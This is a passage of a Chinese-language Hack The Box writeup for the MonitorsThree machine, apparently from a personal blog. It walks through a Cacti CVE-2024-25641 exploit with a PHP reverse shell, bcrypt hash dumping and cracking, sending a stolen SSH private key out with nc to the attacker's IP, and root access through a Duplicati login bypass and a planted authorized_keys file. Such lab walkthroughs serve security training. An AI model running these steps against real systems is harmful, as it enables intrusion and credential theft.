+    >https://github.com/5ma1l/CVE-2024-25641</a></a> clone下来。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="111" src="../wp-contnt/uploads/2024/08/1724828402-image-1024x111.png" alt="" class="wp-image-187" srcset="../legacy/uploads/2024/08/1724828402-image-1024x111.png 1024w, ../legacy/uploads/2024/08/1724828402-image-300x33.png 300w, ../legacy/uploads/2024/08/1724828402-image-768x83.png 768w, ../legacy/uploads/2024/08/1724828402-image-1536x167.png 1536w, ../legacy/uploads/2024/08/1724828402-image.png 1890w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>exploit需要四个输入</p>
+<ul class="wp-block-list">
+  <li>
+    URL：cacti服务器地址
+  </li>
+  <li>
+    username：用户名
+  </li>
+  <li>
+    password：密码
+  </li>
+  <li>
+    -payload：php数据
+  </li>
+</ul>
+<p>在<a href="https://www.revshells.com/" target="_blank"  rel="nofollow" ><a class="link" href="https://www.revshells.com/"  target="_blank" rel="noopener"
+    >https://www.revshells.com/</a></a>里生成一个PHP PentestMonkey的reverse shell 并存到本地</p>
+<p>打开本地端口监听, 并尝试攻击</p>
+<pre class="wp-block-code language-bash"><code>nc -nlvp 4444
+
+# open another terminal & run the following:
+python3 exploit.py -p rev.php http://cacti.monitorsthree.htb/cacti admin greenxxxxxxx</code></pre><figure class="wp-block-image size-large">
+<p><img loading="lazy" decoding="async" width="1024" height="203" src="../wp-contnt/uploads/2024/08/1724828660-image-1024x203.png" alt="" class="wp-image-202" srcset="../legacy/uploads/2024/08/1724828660-image-1024x203.png 1024w, ../legacy/uploads/2024/08/1724828660-image-300x59.png 300w, ../legacy/uploads/2024/08/1724828660-image-768x152.png 768w, ../legacy/uploads/2024/08/1724828660-image-1536x305.png 1536w, ../legacy/uploads/2024/08/1724828660-image.png 1785w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>Ok, 拿到shell。</p>
+<h2 id="post-enumeration">#Post Enumeration
+</h2><p>先把shell升级一下变成TTY shell</p>
+<pre class="wp-block-code language-bash"><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+<p>跑一些基础的enumeration指令</p>
+<pre class="wp-block-code language-bash"><code>cat /etc/passwd | grep home
+output:
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+marcus:x:1000:1000:Marcus:/home/marcus:/bin/bash
+
+--------------------
+ls -lah /etc/cron*
+output:
+ls -lah /etc/cron*
+-rw-r--r-- 1 root root 1.2K Mar 23  2022 /etc/crontab
+
+/etc/cron.d:
+total 36K
+drwxr-xr-x   2 root root 4.0K Aug 28 02:47 .
+drwxr-xr-x 118 root root 4.0K Aug 19 13:09 ..
+-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
+-rw-r--r--   1 root root   67 May 18 21:47 cacti
+-rw-r--r--   1 root root   46 May 20 17:30 cleanup_cacti
+-rw-r--r--   1 root root   47 May 21 16:24 cleanup_cron
+-rw-r--r--   1 root root   69 Aug 18 10:18 duplicati
+-rw-r--r--   1 root root  201 Jan  8  2022 e2scrub_all
+-rw-r--r--   1 root root  712 Jan  9  2024 php
+
+/etc/cron.daily:
+total 36K
+drwxr-xr-x   2 root root 4.0K Aug 19 12:28 .
+drwxr-xr-x 118 root root 4.0K Aug 19 13:09 ..
+-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
+-rwxr-xr-x   1 root root  376 Nov 11  2019 apport
+-rwxr-xr-x   1 root root 1.5K Apr  8  2022 apt-compat
+-rwxr-xr-x   1 root root  123 Dec  5  2021 dpkg
+-rwxr-xr-x   1 root root  377 May 25  2022 logrotate
+-rwxr-xr-x   1 root root 1.3K Mar 17  2022 man-db
+-rwxr-xr-x   1 root root  652 Dec  7  2020 plocate
+
+/etc/cron.hourly:
+total 12K
+drwxr-xr-x   2 root root 4.0K Aug 10  2023 .
+drwxr-xr-x 118 root root 4.0K Aug 19 13:09 ..
+-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
+
+/etc/cron.monthly:
+total 12K
+drwxr-xr-x   2 root root 4.0K Aug 10  2023 .
+drwxr-xr-x 118 root root 4.0K Aug 19 13:09 ..
+-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
+
+/etc/cron.weekly:
+total 16K
+drwxr-xr-x   2 root root 4.0K Aug 10  2023 .
+drwxr-xr-x 118 root root 4.0K Aug 19 13:09 ..
+-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
+-rwxr-xr-x   1 root root 1020 Mar 17  2022 man-db
+----------------------------
+uname -a
+output:
+uname -a
+Linux monitorsthree 5.15.0-118-generic #128-Ubuntu SMP Fri Jul 5 09:28:59 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+----------------------------
+ss -anp
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                                            
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1324/nginx: worker  
+tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      20072/python3       
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:42331         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8200          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:8084            0.0.0.0:*               LISTEN      1259/mono 
+----------------------------
+ls -la /home/
+output:
+ls -la /home/
+total 12
+drwxr-xr-x  3 root   root   4096 May 26 16:34 .
+drwxr-xr-x 18 root   root   4096 Aug 19 13:00 ..
+drwxr-x---  4 marcus marcus 4096 Aug 16 11:35 marcus
+
+......</code></pre>
+<p>机器还有另一个用户marcus，并没有找到什么有用的信息。看看网页配置文件。</p>
+<p>搜索网页 <a href="https://files.cacti.net/docs/html/unix_configure_cacti.html" target="_blank"  rel="nofollow" ><a class="link" href="https://files.cacti.net/docs/html/unix_configure_cacti.html"  target="_blank" rel="noopener"
+    >https://files.cacti.net/docs/html/unix_configure_cacti.html</a></a> 这里说了cacti配置文件在../include/config.php<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="481" src="../wp-contnt/uploads/2024/08/1724829370-image-1024x481.png" alt="" class="wp-image-221" srcset="../legacy/uploads/2024/08/1724829370-image-1024x481.png 1024w, ../legacy/uploads/2024/08/1724829370-image-300x141.png 300w, ../legacy/uploads/2024/08/1724829370-image-768x361.png 768w, ../legacy/uploads/2024/08/1724829370-image.png 1298w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>啊哈，找到了database用户密码。用mysql登录：</p>
+<pre class="wp-block-code language-bash"><code>mysql -u cactiuser -h localhost -p
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 67197
+Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB &#91;(none)]&gt;show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| cacti              |
+| information_schema |
+| mysql              |
++--------------------+
+3 rows in set (0.001 sec)
+MariaDB &#91;(none)]&gt; use cacti
+use cacti
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB &#91;cacti]&gt; show tables;
+show tables;
++-------------------------------------+
+| Tables_in_cacti                     |
++-------------------------------------+
+| aggregate_graph_templates           |
+| aggregate_graph_templates_graph     |
+| aggregate_graph_templates_item      |
+| aggregate_graphs                    |
+| aggregate_graphs_graph_item         |
+| aggregate_graphs_items              |
+| automation_devices                  |
+| automation_graph_rule_items         |
+| automation_graph_rules              |
+| automation_ips                      |
+| automation_match_rule_items         |
+| automation_networks                 |
+| automation_processes                |
+| automation_snmp                     |
+| automation_snmp_items               |
+| automation_templates                |
+| automation_tree_rule_items          |
+| automation_tree_rules               |
+| cdef                                |
+| cdef_items                          |
+| color_template_items                |
+| color_templates                     |
+| colors                              |
+| data_debug                          |
+| data_input                          |
+| data_input_data                     |
+| data_input_fields                   |
+| data_local                          |
+| data_source_profiles                |
+| data_source_profiles_cf             |
+| data_source_profiles_rra            |
+| data_source_purge_action            |
+| data_source_purge_temp              |
+| data_source_stats_daily             |
+| data_source_stats_hourly            |
+| data_source_stats_hourly_cache      |
+| data_source_stats_hourly_last       |
+| data_source_stats_monthly           |
+| data_source_stats_weekly            |
+| data_source_stats_yearly            |
+| data_template                       |
+| data_template_data                  |
+| data_template_rrd                   |
+| external_links                      |
+| graph_local                         |
+| graph_template_input                |
+| graph_template_input_defs           |
+| graph_templates                     |
+| graph_templates_gprint              |
+| graph_templates_graph               |
+| graph_templates_item                |
+| graph_tree                          |
+| graph_tree_items                    |
+| host                                |
+| host_graph                          |
+| host_snmp_cache                     |
+| host_snmp_query                     |
+| host_template                       |
+| host_template_graph                 |
+| host_template_snmp_query            |
+| plugin_config                       |
+| plugin_db_changes                   |
+| plugin_hooks                        |
+| plugin_realms                       |
+| poller                              |
+| poller_command                      |
+| poller_data_template_field_mappings |
+| poller_item                         |
+| poller_output                       |
+| poller_output_boost                 |
+| poller_output_boost_local_data_ids  |
+| poller_output_boost_processes       |
+| poller_output_realtime              |
+| poller_reindex                      |
+| poller_resource_cache               |
+| poller_time                         |
+| processes                           |
+| reports                             |
+| reports_items                       |
+| rrdcheck                            |
+| sessions                            |
+| settings                            |
+| settings_tree                       |
+| settings_user                       |
+| settings_user_group                 |
+| sites                               |
+| snmp_query                          |
+| snmp_query_graph                    |
+| snmp_query_graph_rrd                |
+| snmp_query_graph_rrd_sv             |
+| snmp_query_graph_sv                 |
+| snmpagent_cache                     |
+| snmpagent_cache_notifications       |
+| snmpagent_cache_textual_conventions |
+| snmpagent_managers                  |
+| snmpagent_managers_notifications    |
+| snmpagent_mibs                      |
+| snmpagent_notifications_log         |
+| user_auth                           |
+| user_auth_cache                     |
+| user_auth_group                     |
+| user_auth_group_members             |
+| user_auth_group_perms               |
+| user_auth_group_realm               |
+| user_auth_perms                     |
+| user_auth_realm                     |
+| user_auth_row_cache                 |
+| user_domains                        |
+| user_domains_ldap                   |
+| user_log                            |
+| vdef                                |
+| vdef_items                          |
+| version                             |
++-------------------------------------+
+113 rows in set (0.001 sec)
+MariaDB &#91;cacti]&gt; select * from user_auth;
+select * from user_auth;
++----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
+| id | username | password                                                     | realm | full_name     | email_address            | must_change_password | password_change | show_tree | show_list | show_preview | graph_settings | login_opts | policy_graphs | policy_trees | policy_hosts | policy_graph_templates | enabled | lastchange | lastlogin | password_history | locked | failed_attempts | lastfail | reset_perms |
++----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
+|  1 | admin    | $2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G |     0 | Administrator | marcus@monitorsthree.htb |                      |                 | on        | on        | on           | on             |          2 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 | -1               |        |               0 |        0 |   436423766 |
+|  3 | guest    | $2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu |     0 | Guest Account | guest@monitorsthree.htb  |                      |                 | on        | on        | on           |                |          1 |             1 |            1 |            1 |                      1 |         |         -1 |        -1 | -1               |        |               0 |        0 |  3774379591 |
+|  4 | marcus   | $2y$10$Fq8wGXvlM3Le.***************************************************** |     0 | Marcus        | marcus@monitorsthree.htb |                      | on              | on        | on        | on           | on             |          1 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 |                  |        |               0 |        0 |  1677427318 |
++----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
+3 rows in set (0.000 sec)</code></pre>
+<p>找到了marcus的hash，接下来就要交给hashcat了。**$2*$**的prefix一般都是bcrypt, 用hashcat暴力破解：</p>
+<pre class="wp-block-code language-bash"><code>hashcat -m 3200 -a 0 ./hash /usr/share/wordlists/rockyou.txt</code></pre><figure class="wp-block-image size-large">
+<p><img loading="lazy" decoding="async" width="1024" height="679" src="../wp-contnt/uploads/2024/08/1724829794-image-1024x679.png" alt="" class="wp-image-230" srcset="../legacy/uploads/2024/08/1724829794-image-1024x679.png 1024w, ../legacy/uploads/2024/08/1724829794-image-300x199.png 300w, ../legacy/uploads/2024/08/1724829794-image-768x509.png 768w, ../legacy/uploads/2024/08/1724829794-image.png 1399w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>破解成功，拿到marcus密码。</p>
+<h2 id="user-flag">#User flag
+</h2><p>用得到的credential 以marcus ssh 登录。</p>
+<pre class="wp-block-code language-bash"><code>CVE-2024-25641 git:(master): ssh marcus@cacti.monitorsthree.htb
+marcus@cacti.monitorsthree.htb: Permission denied (publickey).</code></pre>
+<p>好吧，把密码认证关了，但我还有个active shell，直接su marcus试试。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="918" height="172" src="../wp-contnt/uploads/2024/08/1724830032-image.png" alt="" class="wp-image-236" srcset="../legacy/uploads/2024/08/1724830032-image.png 918w, ../legacy/uploads/2024/08/1724830032-image-300x56.png 300w, ../legacy/uploads/2024/08/1724830032-image-768x144.png 768w" sizes="auto, (max-width: 918px) 100vw, 918px" /> </figure></p>
+<p>成功。在marcus home目录下找到user flag</p>
+<h2 id="enumeration-again">#Enumeration Again..
+</h2><p>marcus home目录下有.ssh 文件夹，且里面有id_rsa 私钥。(这个id_rsa可能是别人留下的，好多人打一个机器, 但也可以用ssh-keygen 自己生成一对公私钥). 使用nc下载到本地</p>
+<p>ssh登录成功。</p>
+<pre class="wp-block-code language-bash"><code>nc 10.10.14.13 4445 &lt; id_rsa
+
+#kali
+nc -nlvp 4445 &gt; id_rsa
+
+ssh -i id_rsa marcus@cacti.monitorsthree.htb
+Last login: Tue Aug 20 11:34:00 2024
+marcus@monitorsthree:~$</code></pre>
+<p>在/opt/目录下发现了一些文件, /opt/目录通常是存放第三方软件的地方。</p>
+<pre class="wp-block-code language-bash"><code>drwxr-xr-x 3 root root 4096 May 20 15:53 backups
+drwx--x--x 4 root root 4096 May 20 14:38 containerd
+-rw-r--r-- 1 root root  318 May 26 16:08 docker-compose.yml
+drwxr-xr-x 3 root root 4096 Aug 18 08:00 duplicati</code></pre>
+<p>在/opt/duplicati/ 目录下发现了三个数据库文件</p>
+<pre class="wp-block-code language-bash"><code>total 2832
+drwxr-xr-x 2 root root    4096 Aug 18 08:00 control_dir_v2
+-rw-r--r-- 1 root root 2461696 Aug 28 02:47 CTADPNHLTC.sqlite
+-rw------- 1 root root  163840 Aug 28 04:34 DKKEDMSRFK.sqlite
+-rw-r--r-- 1 root root   94208 Aug 28 04:40 Duplicati-server.sqlite
+-rw------- 1 root root  167936 Aug 28 04:34 UZOFQVHQXW.sqlite</code></pre>
+<p>使用scp下载，并用sqlite打开查看。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="902" src="../wp-contnt/uploads/2024/08/1724831500-image-1024x902.png" alt="" class="wp-image-255" srcset="../legacy/uploads/2024/08/1724831500-image-1024x902.png 1024w, ../legacy/uploads/2024/08/1724831500-image-300x264.png 300w, ../legacy/uploads/2024/08/1724831500-image-768x676.png 768w, ../legacy/uploads/2024/08/1724831500-image.png 1266w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>在Duplicati-server.sqlite数据库的option中发现了 server-passphrase。看着像base64加密的，尝试用base64解码<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="506" height="60" src="../wp-contnt/uploads/2024/08/1724831574-image.png" alt="" class="wp-image-257" srcset="../legacy/uploads/2024/08/1724831574-image.png 506w, ../legacy/uploads/2024/08/1724831574-image-300x36.png 300w" sizes="auto, (max-width: 506px) 100vw, 506px" /> </figure></p>
+<p>乱码。。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="864" height="162" src="../wp-contnt/uploads/2024/08/1724831600-image.png" alt="" class="wp-image-258" srcset="../legacy/uploads/2024/08/1724831600-image.png 864w, ../legacy/uploads/2024/08/1724831600-image-300x56.png 300w, ../legacy/uploads/2024/08/1724831600-image-768x144.png 768w" sizes="auto, (max-width: 864px) 100vw, 864px" /> </figure></p>
+<p>也找不到对应的hash类型。先记录下。</p>
+<p>搜了一圈没再发现什么可疑的东西。想起服务器在内网开放了8200端口，用ssh port forward一下看看是什么。</p>
+<pre class="wp-block-code language-bash"><code>ssh -L 8200:127.0.0.1:8200 marcus@cacti.monitorsthree.htb -i id_rsa -N</code></pre>
+<h3 id="root-flag">#Root flag
+</h3><p>打开浏览器访问 <a href="http://localhost:8200" target="_blank"  rel="nofollow" >http://localhost:8200</a><figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="965" height="528" src="../wp-contnt/uploads/2024/08/1724830749-image.png" alt="" class="wp-image-252" srcset="../legacy/uploads/2024/08/1724830749-image.png 965w, ../legacy/uploads/2024/08/1724830749-image-300x164.png 300w, ../legacy/uploads/2024/08/1724830749-image-768x420.png 768w" sizes="auto, (max-width: 965px) 100vw, 965px" /> </figure></p>
+<p class="has-text-align-center">
+  <em>Duplicati 是一个开源的、跨平台的备份解决方案，主要用于加密、备份和恢复文件。它通过 Web 界面进行管理和配置，使得用户能够轻松地在各种存储目标之间创建和管理备份任务。Duplicati 支持多种操作系统，包括 Windows、macOS 和 Linux。</em>
+</p>
+<p>搜索duplicati exploit找到了这个文章 <a href="https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee" target="_blank"  rel="nofollow" ><a class="link" href="https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee"  target="_blank" rel="noopener"
+    >https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee</a></a></p>
+<p>了解到duplicati的login.js暴露了加密方法：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="338" src="../wp-contnt/uploads/2024/08/1724831923-image-1024x338.png" alt="" class="wp-image-262" srcset="../legacy/uploads/2024/08/1724831923-image-1024x338.png 1024w, ../legacy/uploads/2024/08/1724831923-image-300x99.png 300w, ../legacy/uploads/2024/08/1724831923-image-768x253.png 768w, ../legacy/uploads/2024/08/1724831923-image.png 1458w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>使用文中方法，把得到的passphrase进行转换。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="592" src="../wp-contnt/uploads/2024/08/1724832070-image-1024x592.png" alt="" class="wp-image-263" srcset="../legacy/uploads/2024/08/1724832070-image-1024x592.png 1024w, ../legacy/uploads/2024/08/1724832070-image-300x173.png 300w, ../legacy/uploads/2024/08/1724832070-image-768x444.png 768w, ../legacy/uploads/2024/08/1724832070-image-1536x887.png 1536w, ../legacy/uploads/2024/08/1724832070-image.png 2044w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>在firfox中打开inspect-&gt;console</p>
+<pre class="wp-block-code language-javascript"><code>allow pasting 
+
+var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse("r4SX7ebpyPo4mlDvMkJOucJTfHQhXftKP2VVShRHlY=") + "59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a")).toString(CryptoJS.enc.Base64);
+
+noncedpwd
+"UvrZnpXsxYhieUFAF2H+X6hmFRtIcN9hHGTCWaR2smU="</code></pre>
+<p>并在burpsuite中把拦截到的请求data： password替换成生成的值。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="574" src="../wp-contnt/uploads/2024/08/1724832721-image-1024x574.png" alt="" class="wp-image-265" srcset="../legacy/uploads/2024/08/1724832721-image-1024x574.png 1024w, ../legacy/uploads/2024/08/1724832721-image-300x168.png 300w, ../legacy/uploads/2024/08/1724832721-image-768x431.png 768w, ../legacy/uploads/2024/08/1724832721-image-1536x861.png 1536w, ../legacy/uploads/2024/08/1724832721-image.png 1864w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>登录成功。摸索一番后，了解到这个应用可以备份文件，还可以把备份文件还原到指定目录。</p>
+<p>我们可以在本地生成一个ssh key并把公钥传递到靶机上。通过备份把authorized_keys放到root根目录下的.ssh文件里，就可以通过密钥访问root。先在本地生成ssh key，并把authorized_keys传递到靶机</p>
+<pre class="wp-block-code language-bash"><code># kali linux
+ssh-keygen -t rsa -b 4096 -f monitor
+scp -i id_rsa monitor.pub marcus@10.10.11.30:/home/marcus/authorized_keys</code></pre>
+<p>新建一个备份任务：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="531" src="../wp-contnt/uploads/2024/08/1724832964-image-1024x531.png" alt="" class="wp-image-268" srcset="../legacy/uploads/2024/08/1724832964-image-1024x531.png 1024w, ../legacy/uploads/2024/08/1724832964-image-300x156.png 300w, ../legacy/uploads/2024/08/1724832964-image-768x399.png 768w, ../legacy/uploads/2024/08/1724832964-image-1536x797.png 1536w, ../legacy/uploads/2024/08/1724832964-image.png 1684w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure> <figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="459" src="../wp-contnt/uploads/2024/08/1724833998-image-1024x459.png" alt="" class="wp-image-271" srcset="../legacy/uploads/2024/08/1724833998-image-1024x459.png 1024w, ../legacy/uploads/2024/08/1724833998-image-300x135.png 300w, ../legacy/uploads/2024/08/1724833998-image-768x344.png 768w, ../legacy/uploads/2024/08/1724833998-image-1536x689.png 1536w, ../legacy/uploads/2024/08/1724833998-image.png 1701w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /></figure></p>
+<p>关闭自动备份<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="565" src="../wp-contnt/uploads/2024/08/1724834038-image-1024x565.png" alt="" class="wp-image-272" srcset="../legacy/uploads/2024/08/1724834038-image-1024x565.png 1024w, ../legacy/uploads/2024/08/1724834038-image-300x165.png 300w, ../legacy/uploads/2024/08/1724834038-image-768x424.png 768w, ../legacy/uploads/2024/08/1724834038-image-1536x847.png 1536w, ../legacy/uploads/2024/08/1724834038-image.png 1677w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>运行后，选择直接从备份还原<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="478" src="../wp-contnt/uploads/2024/08/1724834076-image-1024x478.png" alt="" class="wp-image-273" srcset="../legacy/uploads/2024/08/1724834076-image-1024x478.png 1024w, ../legacy/uploads/2024/08/1724834076-image-300x140.png 300w, ../legacy/uploads/2024/08/1724834076-image-768x359.png 768w, ../legacy/uploads/2024/08/1724834076-image-1536x718.png 1536w, ../legacy/uploads/2024/08/1724834076-image.png 1888w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure> <figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="553" src="../wp-contnt/uploads/2024/08/1724834247-image-1024x553.png" alt="" class="wp-image-275" srcset="../legacy/uploads/2024/08/1724834247-image-1024x553.png 1024w, ../legacy/uploads/2024/08/1724834247-image-300x162.png 300w, ../legacy/uploads/2024/08/1724834247-image-768x414.png 768w, ../legacy/uploads/2024/08/1724834247-image-1536x829.png 1536w, ../legacy/uploads/2024/08/1724834247-image.png 1768w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /></figure></p>
+<p>还原到root的.ssh文件下</p>
+<p>显示成功后用密钥连接</p>
+<pre class="wp-block-code language-bash"><code>➜  Monitor ssh -i monitor root@cacti.monitorsthree.htb                  
+Last login: Tue Aug 20 15:21:21 2024
+root@monitorsthree:~# ls
+root.txt  scripts
+root@monitorsthree:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@monitorsthree:~#</code></pre>
+<p><strong>BOOM. Rooted.</strong></p>
+<p>Happy Hacking.</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            Last updated on Jan 01, 2025 08:44 UTC
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/htb-flight-Writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/legacy/uploads/2025/05/1748606734-a7af9035e5089332dfbfeb328d663f3e-150x150.webp" loading="lazy" data-key="" data-hash="/legacy/uploads/2025/05/1748606734-a7af9035e5089332dfbfeb328d663f3e-150x150.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB-Flight-Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb-underpass-Writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/legacy/uploads/2025/05/1747065644-456a4d2e52f182847fb0a2dba0420a44.webp" loading="lazy" data-key="" data-hash="/legacy/uploads/2025/05/1747065644-456a4d2e52f182847fb0a2dba0420a44.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB-UnderPass-Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb-administrator-Writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/legacy/uploads/2025/04/1745035819-download-150x150.png" loading="lazy" data-key="" data-hash="/legacy/uploads/2025/04/1745035819-download-150x150.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB-Administrator-Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb-bashed-Writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/legacy/uploads/2025/04/1745047500-bashed-150x150.webp" loading="lazy" data-key="" data-hash="/legacy/uploads/2025/04/1745047500-bashed-150x150.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB-Bashed-Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb-retired-magic-Writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/legacy/uploads/2024/08/1724907410-73eebbbdfbbfd46258ea2ae7e52d9479-150x150.webp" loading="lazy" data-key="" data-hash="/legacy/uploads/2024/08/1724907410-73eebbbdfbbfd46258ea2ae7e52d9479-150x150.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB-Retired-Magic-Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2025 Jowhite
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
